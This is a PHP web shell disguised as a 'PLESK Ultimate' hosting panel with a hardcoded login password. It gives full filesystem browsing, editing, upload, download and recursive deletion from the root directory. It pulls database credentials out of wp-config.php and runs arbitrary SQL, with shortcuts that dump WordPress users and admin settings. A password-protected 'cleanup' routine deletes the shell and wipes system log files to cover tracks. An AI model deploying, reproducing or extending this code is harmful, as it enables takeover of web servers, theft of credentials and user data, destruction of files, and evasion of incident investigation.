<?php
@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@ini_set('memory_limit', '512M');
session_start();

define('LOGIN_PASSWORD', '123@321');
define('MASTER_PASSWORD', '369@963');
define('SESSION_KEY', 'plesk_ultimate_v7');

function formatBytes($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    elseif ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    elseif ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    else return $bytes . ' B';
}

function getCurrentPath() {
    $path = $_GET['path'] ?? $_SESSION['current_path'] ?? '/';
    if (!is_dir($path)) $path = '/';
    $_SESSION['current_path'] = $path;
    return $path;
}

function deleteRecursive($path) {
    if (is_file($path)) return @unlink($path);
    if (!is_dir($path)) return false;
    $items = array_diff(scandir($path), ['.', '..']);
    foreach ($items as $item) {
        if (!deleteRecursive($path . '/' . $item)) return false;
    }
    return @rmdir($path);
}

function findWpConfig($startPath = '/') {
    $locations = [
        $startPath . '/wp-config.php',
        dirname($_SERVER['DOCUMENT_ROOT']) . '/wp-config.php',
        $_SERVER['DOCUMENT_ROOT'] . '/wp-config.php',
        '/var/www/html/wp-config.php',
        '/home/' . get_current_user() . '/public_html/wp-config.php'
    ];
    
    foreach ($locations as $location) {
        if (file_exists($location)) return $location;
    }
    return false;
}

function parseWpConfig($configFile) {
    if (!file_exists($configFile)) return false;
    $content = file_get_contents($configFile);
    
    preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\)/", $content, $dbname);
    preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]\s*\)/", $content, $dbuser);
    preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\)/", $content, $dbpass);
    preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]\s*\)/", $content, $dbhost);
    
    return [
        'name' => $dbname[1] ?? '',
        'user' => $dbuser[1] ?? '',
        'pass' => $dbpass[1] ?? '',
        'host' => $dbhost[1] ?? 'localhost'
    ];
}

function scanAllFiles($dir, $showHidden = true) {
    $files = [];
    if (!is_dir($dir)) return $files;
    
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        if (!$showHidden && $item[0] === '.') continue;
        $files[] = $item;
    }
    return $files;
}

function findAllPhpFiles($startPath = '/') {
    $phpFiles = [];
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($startPath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        foreach ($iterator as $file) {
            if ($file->isFile() && $file->getExtension() === 'php') {
                $phpFiles[] = $file->getPathname();
            }
        }
    } catch (Exception $e) {
        // Continue silently
    }
    return $phpFiles;
}

if (isset($_POST['login']) && $_POST['password'] === LOGIN_PASSWORD) {
    $_SESSION[SESSION_KEY] = true;
    header('Location: ' . basename(__FILE__));
    exit;
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . basename(__FILE__));
    exit;
}

if (!isset($_SESSION[SESSION_KEY])) {
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PLESK Ultimate</title>
<style>
body {
    background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
    color: #00ff00;
    font-family: 'Courier New', monospace;
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
}
.login-box {
    background: rgba(0, 20, 0, 0.95);
    border: 3px solid #00ff00;
    border-radius: 15px;
    padding: 50px;
    text-align: center;
    box-shadow: 0 0 50px rgba(0, 255, 0, 0.5);
    backdrop-filter: blur(10px);
}
.logo {
    font-size: 28px;
    margin-bottom: 30px;
    text-shadow: 0 0 20px #00ff00;
    animation: glow 2s ease-in-out infinite alternate;
}
@keyframes glow {
    from { text-shadow: 0 0 20px #00ff00; }
    to { text-shadow: 0 0 30px #00ff00, 0 0 40px #00ff00; }
}
input[type="password"] {
    width: 300px;
    padding: 15px;
    background: rgba(0, 0, 0, 0.8);
    border: 2px solid #00ff00;
    color: #00ff00;
    font-family: inherit;
    margin-bottom: 25px;
    border-radius: 8px;
    font-size: 16px;
}
input[type="submit"] {
    padding: 15px 40px;
    background: linear-gradient(45deg, #00ff00, #00cc00);
    color: #000;
    border: none;
    cursor: pointer;
    font-weight: bold;
    border-radius: 8px;
    font-size: 16px;
    transition: all 0.3s;
}
input[type="submit"]:hover {
    transform: scale(1.05);
    box-shadow: 0 0 20px rgba(0, 255, 0, 0.7);
}
</style>
</head>
<body>
<div class="login-box">
    <div class="logo">◆ PLESK ULTIMATE ◆</div>
    <form method="post">
        <input type="password" name="password" placeholder="Enter Ultimate License Key" required autofocus>
        <br>
        <input type="submit" name="login" value="► ACCESS ULTIMATE SYSTEM ◄">
    </form>
</div>
</body>
</html>
<?php
    exit;
}

if (isset($_POST['action'])) {
    $action = $_POST['action'];
    
    if ($action === 'delete' && isset($_POST['target'])) {
        deleteRecursive($_POST['target']);
    }
    
    if ($action === 'delete_directory' && isset($_POST['directory'])) {
        deleteRecursive($_POST['directory']);
    }
    
    if ($action === 'cleanup_system' && $_POST['master_key'] === MASTER_PASSWORD) {
        $phpFiles = findAllPhpFiles($_SERVER['DOCUMENT_ROOT']);
        foreach ($phpFiles as $file) {
            if (basename($file) === basename(__FILE__)) {
                @unlink($file);
            }
        }
        
        $logDirs = ['/var/log', '/tmp', '/var/tmp'];
        foreach ($logDirs as $dir) {
            if (is_dir($dir)) {
                $logs = glob($dir . '/*.log');
                foreach ($logs as $log) @unlink($log);
            }
        }
        echo '<script>alert("System cleaned successfully!"); location.href="' . basename(__FILE__) . '";</script>';
    }
    
    if ($action === 'upload' && isset($_FILES['file'])) {
        $uploadPath = getCurrentPath() . '/' . $_FILES['file']['name'];
        move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath);
    }
    
    if ($action === 'create_dir' && $_POST['dirname']) {
        mkdir(getCurrentPath() . '/' . $_POST['dirname'], 0755, true);
    }
    
    if ($action === 'create_file' && $_POST['filename']) {
        file_put_contents(getCurrentPath() . '/' . $_POST['filename'], '');
    }
    
    // Database table actions
    if ($action === 'update_record') {
        $wpConfigFile = findWpConfig(getCurrentPath());
        $dbConfig = parseWpConfig($wpConfigFile);
        try {
            $pdo = new PDO("mysql:host={$dbConfig['host']};dbname={$dbConfig['name']}", $dbConfig['user'], $dbConfig['pass']);
            $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            
            $table = $_POST['table'];
            $id = $_POST['record_id'];
            $updates = [];
            $params = [];
            
            foreach ($_POST as $key => $value) {
                if (strpos($key, 'field_') === 0) {
                    $fieldName = substr($key, 6);
                    $updates[] = "`$fieldName` = ?";
                    $params[] = $value;
                }
            }
            
            if (!empty($updates)) {
                $params[] = $id;
                $sql = "UPDATE `$table` SET " . implode(', ', $updates) . " WHERE id = ?";
                $stmt = $pdo->prepare($sql);
                $stmt->execute($params);
            }
        } catch (Exception $e) {
            // Handle error silently
        }
        header('Location: ' . basename(__FILE__) . '?database&table=' . urlencode($table));
        exit;
    }
    
    if ($action === 'delete_record') {
        $wpConfigFile = findWpConfig(getCurrentPath());
        $dbConfig = parseWpConfig($wpConfigFile);
        try {
            $pdo = new PDO("mysql:host={$dbConfig['host']};dbname={$dbConfig['name']}", $dbConfig['user'], $dbConfig['pass']);
            $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            
            $table = $_POST['table'];
            $id = $_POST['record_id'];
            
            $stmt = $pdo->prepare("DELETE FROM `$table` WHERE id = ?");
            $stmt->execute([$id]);
        } catch (Exception $e) {
            // Handle error silently
        }
        header('Location: ' . basename(__FILE__) . '?database&table=' . urlencode($table));
        exit;
    }
    
    header('Location: ' . basename(__FILE__) . '?path=' . urlencode(getCurrentPath()));
    exit;
}

if (isset($_GET['download']) && file_exists($_GET['download'])) {
    $file = $_GET['download'];
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}

if (isset($_GET['edit']) && file_exists($_GET['edit'])) {
    $file = $_GET['edit'];
    $content = file_get_contents($file);
    
    if (isset($_POST['save'])) {
        file_put_contents($file, $_POST['content']);
        header('Location: ' . basename(__FILE__) . '?path=' . urlencode(dirname($file)));
        exit;
    }
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Edit File - PLESK Ultimate</title>
<style>
body { background: #0a0a0a; color: #00ff00; font-family: monospace; margin: 0; padding: 20px; }
.header { border-bottom: 2px solid #00ff00; padding-bottom: 15px; margin-bottom: 20px; }
textarea { width: 100%; height: 500px; background: #000; color: #00ff00; border: 2px solid #00ff00; padding: 15px; font-family: monospace; font-size: 14px; }
.btn { background: #00ff00; color: #000; padding: 10px 20px; border: none; margin-right: 10px; cursor: pointer; border-radius: 5px; text-decoration: none; display: inline-block; }
.btn:hover { background: #00cc00; }
</style>
</head>
<body>
<div class="header">
    <h2>📝 Editing: <?php echo htmlspecialchars($file); ?></h2>
</div>
<form method="post">
    <textarea name="content"><?php echo htmlspecialchars($content); ?></textarea>
    <br><br>
    <button type="submit" name="save" class="btn">💾 Save File</button>
    <a href="<?php echo basename(__FILE__) . '?path=' . urlencode(dirname($file)); ?>" class="btn">🔙 Back</a>
</form>
</body>
</html>
<?php
    exit;
}

if (isset($_GET['database'])) {
    $wpConfigFile = findWpConfig(getCurrentPath());
    if (!$wpConfigFile) {
        echo '<script>alert("wp-config.php not found!"); history.back();</script>';
        exit;
    }
    
    $dbConfig = parseWpConfig($wpConfigFile);
    if (!$dbConfig['name']) {
        echo '<script>alert("Database configuration not found!"); history.back();</script>';
        exit;
    }
    
    try {
        $pdo = new PDO("mysql:host={$dbConfig['host']};dbname={$dbConfig['name']}", $dbConfig['user'], $dbConfig['pass']);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        // Handle table-specific view
        if (isset($_GET['table'])) {
            $tableName = $_GET['table'];
            
            // Get table structure
            $structure = $pdo->query("DESCRIBE `$tableName`")->fetchAll(PDO::FETCH_ASSOC);
            
            // Get table data with pagination
            $page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
            $limit = 20;
            $offset = ($page - 1) * $limit;
            
            $countStmt = $pdo->query("SELECT COUNT(*) FROM `$tableName`");
            $totalRecords = $countStmt->fetchColumn();
            $totalPages = ceil($totalRecords / $limit);
            
            $dataStmt = $pdo->query("SELECT * FROM `$tableName` LIMIT $limit OFFSET $offset");
            $data = $dataStmt->fetchAll(PDO::FETCH_ASSOC);
            
            // Handle record editing
            if (isset($_GET['edit_record'])) {
                $recordId = $_GET['edit_record'];
                $recordStmt = $pdo->prepare("SELECT * FROM `$tableName` WHERE id = ?");
                $recordStmt->execute([$recordId]);
                $record = $recordStmt->fetch(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Edit Record - PLESK Ultimate</title>
<style>
body { background: #0a0a0a; color: #00ff00; font-family: monospace; margin: 0; padding: 20px; }
.header { background: #001100; padding: 20px; border: 2px solid #00ff00; margin-bottom: 20px; border-radius: 10px; }
.form-group { margin-bottom: 15px; }
.form-group label { display: block; margin-bottom: 5px; font-weight: bold; }
.form-group input, .form-group textarea { width: 100%; padding: 8px; background: #000; color: #00ff00; border: 1px solid #00ff00; border-radius: 3px; }
.form-group textarea { height: 80px; resize: vertical; }
.btn { background: #00ff00; color: #000; padding: 10px 20px; border: none; cursor: pointer; margin: 5px; border-radius: 5px; text-decoration: none; display: inline-block; }
.btn:hover { background: #00cc00; }
.btn-red { background: #ff4444; color: #fff; }
.btn-red:hover { background: #cc0000; }
</style>
</head>
<body>
<div class="header">
    <h2>✏️ Edit Record in <?php echo htmlspecialchars($tableName); ?></h2>
    <a href="<?php echo basename(__FILE__) . '?database&table=' . urlencode($tableName); ?>" class="btn">🔙 Back to Table</a>
</div>

<form method="post">
    <input type="hidden" name="action" value="update_record">
    <input type="hidden" name="table" value="<?php echo htmlspecialchars($tableName); ?>">
    <input type="hidden" name="record_id" value="<?php echo htmlspecialchars($recordId); ?>">
    
    <?php foreach ($structure as $field): ?>
    <div class="form-group">
        <label><?php echo htmlspecialchars($field['Field']); ?> (<?php echo $field['Type']; ?>)</label>
        <?php if (strlen($record[$field['Field']]) > 100): ?>
            <textarea name="field_<?php echo htmlspecialchars($field['Field']); ?>"><?php echo htmlspecialchars($record[$field['Field']]); ?></textarea>
        <?php else: ?>
            <input type="text" name="field_<?php echo htmlspecialchars($field['Field']); ?>" value="<?php echo htmlspecialchars($record[$field['Field']]); ?>">
        <?php endif; ?>
    </div>
    <?php endforeach; ?>
    
    <button type="submit" class="btn">💾 Update Record</button>
    <a href="<?php echo basename(__FILE__) . '?database&table=' . urlencode($tableName); ?>" class="btn">❌ Cancel</a>
</form>

<div style="margin-top: 30px;">
    <form method="post" onsubmit="return confirm('Are you sure you want to delete this record?');">
        <input type="hidden" name="action" value="delete_record">
        <input type="hidden" name="table" value="<?php echo htmlspecialchars($tableName); ?>">
        <input type="hidden" name="record_id" value="<?php echo htmlspecialchars($recordId); ?>">
        <button type="submit" class="btn btn-red">🗑️ Delete Record</button>
    </form>
</div>

</body>
</html>
<?php
                exit;
            }
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Table: <?php echo htmlspecialchars($tableName); ?> - PLESK Ultimate</title>
<style>
body { background: #0a0a0a; color: #00ff00; font-family: monospace; margin: 0; padding: 20px; }
.header { background: #001100; padding: 20px; border: 2px solid #00ff00; margin-bottom: 20px; border-radius: 10px; }
.table-info { background: #000; padding: 15px; border: 1px solid #333; margin-bottom: 20px; border-radius: 5px; }
.btn { background: #00ff00; color: #000; padding: 8px 15px; border: none; cursor: pointer; margin: 5px; border-radius: 5px; text-decoration: none; display: inline-block; }
.btn:hover { background: #00cc00; }
.btn-red { background: #ff4444; color: #fff; }
table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 12px; }
th, td { border: 1px solid #333; padding: 6px; text-align: left; word-break: break-all; }
th { background: #002200; position: sticky; top: 0; }
tr:hover { background: rgba(0, 255, 0, 0.1); }
.pagination { margin: 20px 0; text-align: center; }
.pagination a { display: inline-block; padding: 8px 12px; margin: 0 2px; background: #001100; border: 1px solid #00ff00; color: #00ff00; text-decoration: none; }
.pagination a:hover, .pagination .current { background: #00ff00; color: #000; }
.field-actions { white-space: nowrap; }
</style>
</head>
<body>
<div class="header">
    <h2>📊 Table: <?php echo htmlspecialchars($tableName); ?></h2>
    <a href="<?php echo basename(__FILE__) . '?database'; ?>" class="btn">🔙 Back to Database</a>
</div>

<div class="table-info">
    <strong>Total Records:</strong> <?php echo number_format($totalRecords); ?> | 
    <strong>Current Page:</strong> <?php echo $page; ?> of <?php echo $totalPages; ?>
</div>

<?php if ($totalPages > 1): ?>
<div class="pagination">
    <?php if ($page > 1): ?>
        <a href="?database&table=<?php echo urlencode($tableName); ?>&page=1">First</a>
        <a href="?database&table=<?php echo urlencode($tableName); ?>&page=<?php echo $page-1; ?>">Previous</a>
    <?php endif; ?>
    
    <?php for ($i = max(1, $page-5); $i <= min($totalPages, $page+5); $i++): ?>
        <a href="?database&table=<?php echo urlencode($tableName); ?>&page=<?php echo $i; ?>" <?php echo $i == $page ? 'class="current"' : ''; ?>><?php echo $i; ?></a>
    <?php endfor; ?>
    
    <?php if ($page < $totalPages): ?>
        <a href="?database&table=<?php echo urlencode($tableName); ?>&page=<?php echo $page+1; ?>">Next</a>
        <a href="?database&table=<?php echo urlencode($tableName); ?>&page=<?php echo $totalPages; ?>">Last</a>
    <?php endif; ?>
</div>
<?php endif; ?>

<table>
<thead>
    <tr>
        <?php foreach ($structure as $field): ?>
            <th><?php echo htmlspecialchars($field['Field']); ?><br><small>(<?php echo $field['Type']; ?>)</small></th>
        <?php endforeach; ?>
        <th>Actions</th>
    </tr>
</thead>
<tbody>
    <?php foreach ($data as $row): ?>
    <tr>
        <?php foreach ($structure as $field): ?>
            <td><?php echo htmlspecialchars(substr($row[$field['Field']], 0, 100)) . (strlen($row[$field['Field']]) > 100 ? '...' : ''); ?></td>
        <?php endforeach; ?>
        <td class="field-actions">
            <a href="?database&table=<?php echo urlencode($tableName); ?>&edit_record=<?php echo $row['id']; ?>" class="btn">✏️ Edit</a>
        </td>
    </tr>
    <?php endforeach; ?>
</tbody>
</table>

</body>
</html>
<?php
            exit;
        }
        
        // Main database view
        if (isset($_POST['sql_query'])) {
            $query = $_POST['sql_query'];
            try {
                $stmt = $pdo->prepare($query);
                $stmt->execute();
                $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
            } catch (Exception $e) {
                $error = $e->getMessage();
            }
        }
        
        $tables = $pdo->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);
        
    } catch (Exception $e) {
        echo '<script>alert("Database connection failed: ' . $e->getMessage() . '"); history.back();</script>';
        exit;
    }
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Database Manager - PLESK Ultimate</title>
<style>
body { background: #0a0a0a; color: #00ff00; font-family: monospace; margin: 0; padding: 20px; }
.header { background: #001100; padding: 20px; border: 2px solid #00ff00; margin-bottom: 20px; border-radius: 10px; }
.db-info { background: #000; padding: 15px; border: 1px solid #333; margin-bottom: 20px; border-radius: 5px; }
.query-box { width: 100%; height: 150px; background: #000; color: #00ff00; border: 2px solid #00ff00; padding: 10px; font-family: monospace; margin-bottom: 10px; }
.btn { background: #00ff00; color: #000; padding: 8px 15px; border: none; cursor: pointer; margin: 5px; border-radius: 5px; text-decoration: none; display: inline-block; }
.btn:hover { background: #00cc00; }
table { width: 100%; border-collapse: collapse; margin-top: 20px; }
th, td { border: 1px solid #333; padding: 8px; text-align: left; }
th { background: #002200; }
.tables-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; }
.table-card { background: #001100; padding: 15px; border: 2px solid #00ff00; border-radius: 8px; cursor: pointer; transition: all 0.3s; }
.table-card:hover { background: #002200; transform: scale(1.02); }
.table-name { font-size: 16px; font-weight: bold; margin-bottom: 10px; }
.table-info { font-size: 12px; color: #888; }
.error { background: #330000; color: #ff6666; padding: 10px; border: 1px solid #ff0000; border-radius: 5px; margin: 10px 0; }
</style>
</head>
<body>
<div class="header">
    <h2>🗄️ Ultimate Database Manager</h2>
    <a href="<?php echo basename(__FILE__); ?>" class="btn">🔙 Back to File Manager</a>
</div>

<div class="db-info">
    <strong>Database:</strong> <?php echo htmlspecialchars($dbConfig['name']); ?><br>
    <strong>Host:</strong> <?php echo htmlspecialchars($dbConfig['host']); ?><br>
    <strong>User:</strong> <?php echo htmlspecialchars($dbConfig['user']); ?><br>
    <strong>Config File:</strong> <?php echo htmlspecialchars($wpConfigFile); ?><br>
    <strong>Total Tables:</strong> <?php echo count($tables); ?>
</div>

<form method="post">
    <textarea name="sql_query" class="query-box" placeholder="Enter SQL query here..."><?php echo isset($_POST['sql_query']) ? htmlspecialchars($_POST['sql_query']) : 'SHOW TABLES;'; ?></textarea>
    <br>
    <button type="submit" class="btn">🚀 Execute Query</button>
    <button type="button" class="btn" onclick="document.querySelector('.query-box').value='SELECT * FROM wp_users;'">👥 Users</button>
    <button type="button" class="btn" onclick="document.querySelector('.query-box').value='SELECT * FROM wp_posts WHERE post_type=\'post\' LIMIT 10;'">📄 Posts</button>
    <button type="button" class="btn" onclick="document.querySelector('.query-box').value='SHOW TABLES;'">📋 Tables</button>
    <button type="button" class="btn" onclick="document.querySelector('.query-box').value='SELECT * FROM wp_options WHERE option_name LIKE \'%admin%\';'">⚙️ Settings</button>
</form>

<?php if (isset($error)): ?>
<div class="error">
    <strong>Error:</strong> <?php echo htmlspecialchars($error); ?>
</div>
<?php endif; ?>

<h3>📊 Database Tables (Click to manage):</h3>
<div class="tables-grid">
    <?php foreach ($tables as $table): ?>
        <?php
        try {
            $countStmt = $pdo->query("SELECT COUNT(*) FROM `$table`");
            $recordCount = $countStmt->fetchColumn();
        } catch (Exception $e) {
            $recordCount = 'N/A';
        }
        ?>
        <div class="table-card" onclick="location.href='?database&table=<?php echo urlencode($table); ?>'">
            <div class="table-name">📊 <?php echo htmlspecialchars($table); ?></div>
            <div class="table-info">
                Records: <?php echo number_format($recordCount); ?><br>
                Click to manage →
            </div>
        </div>
    <?php endforeach; ?>
</div>

<?php if (isset($results)): ?>
<h3>Query Results:</h3>
<div style="overflow-x: auto;">
<table>
    <?php if (!empty($results)): ?>
    <thead>
        <tr>
            <?php foreach (array_keys($results[0]) as $column): ?>
                <th><?php echo htmlspecialchars($column); ?></th>
            <?php endforeach; ?>
        </tr>
    </thead>
    <tbody>
        <?php foreach ($results as $row): ?>
        <tr>
            <?php foreach ($row as $value): ?>
                <td><?php echo htmlspecialchars(substr($value, 0, 100)) . (strlen($value) > 100 ? '...' : ''); ?></td>
            <?php endforeach; ?>
        </tr>
        <?php endforeach; ?>
    </tbody>
    <?php else: ?>
    <tr><td>Query executed successfully (no results to display)</td></tr>
    <?php endif; ?>
</table>
</div>
<?php endif; ?>

</body>
</html>
<?php
    exit;
}

$currentPath = getCurrentPath();
$items = scanAllFiles($currentPath, true);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PLESK Ultimate</title>
<style>
body {
    background: #0a0a0a;
    color: #00ff00;
    font-family: 'Courier New', monospace;
    margin: 0;
    padding: 0;
}
.header {
    background: linear-gradient(135deg, #001100, #002200);
    padding: 15px 20px;
    border-bottom: 3px solid #00ff00;
    display: flex;
    justify-content: space-between;
    align-items: center;
    flex-wrap: wrap;
}
.logo {
    font-size: 20px;
    text-shadow: 0 0 10px #00ff00;
}
.controls {
    display: flex;
    gap: 10px;
    flex-wrap: wrap;
}
.path {
    background: #000;
    padding: 15px 20px;
    border-bottom: 1px solid #333;
    font-size: 14px;
    word-break: break-all;
}
.file-actions {
    margin: 20px;
    display: flex;
    gap: 10px;
    flex-wrap: wrap;
    align-items: center;
}
table {
    width: 100%;
    border-collapse: collapse;
}
th {
    background: #002200;
    padding: 12px 8px;
    text-align: left;
    border-bottom: 2px solid #00ff00;
    position: sticky;
    top: 0;
}
td {
    padding: 8px;
    border-bottom: 1px solid #333;
    vertical-align: middle;
}
tr:hover {
    background: rgba(0, 255, 0, 0.1);
}
a {
    color: #00ff00;
    text-decoration: none;
}
a:hover {
    text-decoration: underline;
}
.dir {
    color: #ffff00;
    font-weight: bold;
}
.hidden {
    color: #888;
    font-style: italic;
}
.btn {
    background: #00ff00;
    color: #000;
    padding: 8px 15px;
    border: none;
    cursor: pointer;
    margin: 2px;
    font-size: 12px;
    border-radius: 5px;
    text-decoration: none;
    display: inline-block;
}
.btn:hover {
    background: #00cc00;
}
.btn-red {
    background: #ff4444;
    color: #fff;
}
.btn-red:hover {
    background: #cc0000;
}
.btn-orange {
    background: #ff8800;
    color: #000;
}
.btn-blue {
    background: #0088ff;
    color: #fff;
}
input[type="file"], input[type="text"], input[type="password"] {
    background: #000;
    color: #00ff00;
    border: 1px solid #00ff00;
    padding: 8px;
    margin: 5px;
    border-radius: 3px;
}
.modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.9);
    z-index: 1000;
}
.modal-content {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #001100;
    padding: 30px;
    border: 3px solid #00ff00;
    border-radius: 10px;
    text-align: center;
}
.system-info {
    background: #001100;
    padding: 15px;
    margin: 20px;
    border: 1px solid #00ff00;
    border-radius: 5px;
    font-size: 12px;
}
</style>
</head>
<body>

<div class="header">
    <div class="logo">◆ PLESK ULTIMATE ◆</div>
    <div class="controls">
        <a href="?database" class="btn btn-blue">🗄️ Database</a>
        <button onclick="showModal('cleanupModal')" class="btn btn-orange">🧹 System Cleanup</button>
        <form method="post" style="display: inline;" onsubmit="return confirm('Delete entire current directory? This cannot be undone!');">
            <input type="hidden" name="action" value="delete_directory">
            <input type="hidden" name="directory" value="<?php echo htmlspecialchars($currentPath); ?>">
            <button type="submit" class="btn btn-red">💥 Delete Current Dir</button>
        </form>
        <a href="?logout" class="btn btn-red">🚪 Logout</a>
    </div>
</div>

<div class="path">
    📍 Current Path: <?php echo htmlspecialchars($currentPath); ?>
    <br>
    📊 Total Items: <?php echo count($items); ?> | Hidden Files: <?php echo count(array_filter($items, function($item) { return $item[0] === '.'; })); ?>
</div>

<div class="system-info">
    <strong>System Info:</strong> 
    PHP <?php echo PHP_VERSION; ?> | 
    Server: <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?> | 
    OS: <?php echo PHP_OS; ?> | 
    User: <?php echo get_current_user(); ?> | 
    Document Root: <?php echo $_SERVER['DOCUMENT_ROOT']; ?>
</div>

<div class="file-actions">
    <form method="post" enctype="multipart/form-data" style="display: inline;">
        <input type="hidden" name="action" value="upload">
        <input type="file" name="file" required>
        <button type="submit" class="btn">📤 Upload</button>
    </form>
    
    <form method="post" style="display: inline;">
        <input type="hidden" name="action" value="create_dir">
        <input type="text" name="dirname" placeholder="New folder name" required>
        <button type="submit" class="btn">📁 Create Dir</button>
    </form>
    
    <form method="post" style="display: inline;">
        <input type="hidden" name="action" value="create_file">
        <input type="text" name="filename" placeholder="New file name" required>
        <button type="submit" class="btn">📄 Create File</button>
    </form>
    
    <button onclick="location.href='?path=/'" class="btn">🏠 Root</button>
    <button onclick="location.href='?path=<?php echo urlencode($_SERVER['DOCUMENT_ROOT']); ?>'" class="btn">🌐 Web Root</button>
</div>

<table>
<thead>
    <tr>
        <th>Name</th>
        <th>Type</th>
        <th>Size</th>
        <th>Permissions</th>
        <th>Owner</th>
        <th>Modified</th>
        <th>Actions</th>
    </tr>
</thead>
<tbody>
    <?php
    if ($currentPath !== '/') {
        $parentPath = dirname($currentPath);
        echo '<tr>';
        echo '<td><a href="?path=' . urlencode($parentPath) . '" class="dir">📁 ..</a></td>';
        echo '<td>Directory</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td>';
        echo '</tr>';
    }
    
    foreach ($items as $item) {
        $fullPath = $currentPath . '/' . $item;
        $isDir = is_dir($fullPath);
        $isHidden = $item[0] === '.';
        $size = $isDir ? '-' : formatBytes(@filesize($fullPath));
        $perms = @substr(sprintf('%o', fileperms($fullPath)), -4);
        $owner = function_exists('posix_getpwuid') ? @posix_getpwuid(fileowner($fullPath))['name'] : @fileowner($fullPath);
        $modified = @date('Y-m-d H:i:s', filemtime($fullPath));
        $type = $isDir ? 'Directory' : (pathinfo($item, PATHINFO_EXTENSION) ?: 'File');
        
        echo '<tr>';
        
        $nameClass = $isDir ? 'dir' : '';
        if ($isHidden) $nameClass .= ' hidden';
        
        if ($isDir) {
            echo '<td><a href="?path=' . urlencode($fullPath) . '" class="' . $nameClass . '">📁 ' . htmlspecialchars($item) . '</a></td>';
        } else {
            echo '<td class="' . $nameClass . '">📄 ' . htmlspecialchars($item) . '</td>';
        }
        
        echo '<td>' . $type . '</td>';
        echo '<td>' . $size . '</td>';
        echo '<td>' . $perms . '</td>';
        echo '<td>' . htmlspecialchars($owner) . '</td>';
        echo '<td>' . $modified . '</td>';
        echo '<td>';
        
        if (!$isDir) {
            echo '<a href="?edit=' . urlencode($fullPath) . '" class="btn">✏️ Edit</a>';
            echo '<a href="?download=' . urlencode($fullPath) . '" class="btn">⬇️ Download</a>';
        }
        
        echo '<form method="post" style="display: inline;" onsubmit="return confirm(\'Delete ' . htmlspecialchars($item) . '?\');">';
        echo '<input type="hidden" name="action" value="delete">';
        echo '<input type="hidden" name="target" value="' . htmlspecialchars($fullPath) . '">';
        echo '<button type="submit" class="btn btn-red">🗑️ Delete</button>';
        echo '</form>';
        
        echo '</td>';
        echo '</tr>';
    }
    ?>
</tbody>
</table>

<!-- System Cleanup Modal -->
<div id="cleanupModal" class="modal">
    <div class="modal-content">
        <h3>🧹 SYSTEM CLEANUP</h3>
        <p>This will delete all PHP files and logs from the system!</p>
        <form method="post">
            <input type="hidden" name="action" value="cleanup_system">
            <input type="password" name="master_key" placeholder="Master Password" required>
            <br><br>
            <button type="submit" class="btn btn-red">🗑️ CLEANUP SYSTEM</button>
            <button type="button" class="btn" onclick="hideModal('cleanupModal')">❌ Cancel</button>
        </form>
    </div>
</div>

<script>
function showModal(id) {
    document.getElementById(id).style.display = 'block';
}

function hideModal(id) {
    document.getElementById(id).style.display = 'none';
}

// Close modal when clicking outside
window.onclick = function(event) {
    if (event.target.classList.contains('modal')) {
        event.target.style.display = 'none';
    }
}

// Keyboard shortcuts
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        document.querySelectorAll('.modal').forEach(modal => {
            modal.style.display = 'none';
        });
    }
});
</script>

</body>
</html>
